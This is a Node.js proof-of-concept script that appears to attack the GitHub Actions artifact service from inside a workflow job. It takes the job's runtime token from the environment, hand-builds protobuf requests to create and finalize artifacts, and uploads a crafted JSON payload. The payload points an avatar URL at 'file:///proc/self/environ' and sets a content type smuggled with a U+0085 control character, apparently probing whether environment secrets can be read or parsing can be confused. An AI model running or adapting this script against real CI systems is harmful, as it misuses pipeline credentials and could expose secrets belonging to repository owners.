const crypto = require('node:crypto');
const https = require('node:https');
const http = require('node:http');
const varint = n => { n = BigInt(n); const o = []; while (n > 0x7fn) { o.push(Number(n & 0x7fn) | 0x80); n >>= 7n; } o.push(Number(n)); return Buffer.from(o); };
const fs = (num, v) => Buffer.concat([varint(num << 3 | 2), varint(v.length), v]);
const fv = (num, v) => Buffer.concat([varint(num << 3), varint(v)]);
const wrap = v => fs(1, v);
const fields = d => { const out = []; let i = 0; const rv = () => { let v = 0n, s = 0n; for (;;) { const b = d[i++]; v |= BigInt(b & 0x7f) << s; if (!(b & 0x80)) return v; s += 7n; } }; while (i < d.length) { const k = rv(); const n = Number(k >> 3n), w = Number(k & 7n); let v; if (w === 0) v = rv(); else if (w === 2) { const l = Number(rv()); v = d.subarray(i, i + l); i += l; } else throw new Error('wire ' + w); out.push([n, w, v]); } return out; };
const payload = Buffer.from(JSON.stringify({ full_name: 'x', owner: { login: 'u', avatar_url: 'file:///proc/self/environ' }, description: '', stargazers_count: 0 }));
const odd = '\u0085application/json';
const putRaw = (url, data, headers) => new Promise((resolve, reject) => {
  const u = new URL(url); const mod = u.protocol === 'https:' ? https : http;
  const r = mod.request(u, { method: 'PUT', headers }, res => { let b = ''; res.on('data', c => b += c); res.on('end', () => resolve({ status: res.statusCode, body: b })); });
  r.on('error', reject); r.end(data);
});
async function post(url, body) { return fetch(url, { method: 'POST', headers: { authorization: 'Bearer ' + process.env.ACTIONS_RUNTIME_TOKEN, 'content-type': 'application/protobuf' }, body }); }
(async () => {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = process.env.ACTIONS_RESULTS_URL.replace(/\/$/, '');
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  const svc = 'github.actions.results.api.v1.ArtifactService';
  for (const v of [0,1,2,3,4,5,6]) {
    const name = `g${v}-${Date.now()}.dat`;
    try {
      const req = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), fv(5, v), fs(6, wrap(Buffer.from(odd)))]);
      const c = await post(`${base}/twirp/${svc}/CreateArtifact`, req);
      const cb = Buffer.from(await c.arrayBuffer());
      if (!c.ok) { console.log('RESULT', v, 'create', c.status, cb.toString().slice(0, 80)); continue; }
      const signed = fields(cb).find(([n, w]) => n === 2 && w === 2)[2].toString();
      const up = await putRaw(signed, payload, { 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': odd, 'Content-Length': String(payload.length) });
      const digest = 'sha256:' + crypto.createHash('sha256').update(payload).digest('hex');
      const fin = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), fv(4, payload.length), fs(5, wrap(Buffer.from(digest)))]);
      const f = await post(`${base}/twirp/${svc}/FinalizeArtifact`, fin);
      const fb = Buffer.from(await f.arrayBuffer());
      if (!f.ok) { console.log('RESULT', v, 'finalize', f.status, fb.toString().slice(0, 80)); continue; }
      const aid = fields(fb).find(([n, w]) => n === 2 && w === 0)[2].toString();
      console.log('RESULT', v, 'id', aid);
    } catch (e) { console.log('RESULT', v, 'ERR', String(e).slice(0, 100)); }
  }
})().catch(e => { console.error('FATAL', e); process.exitCode = 1; });
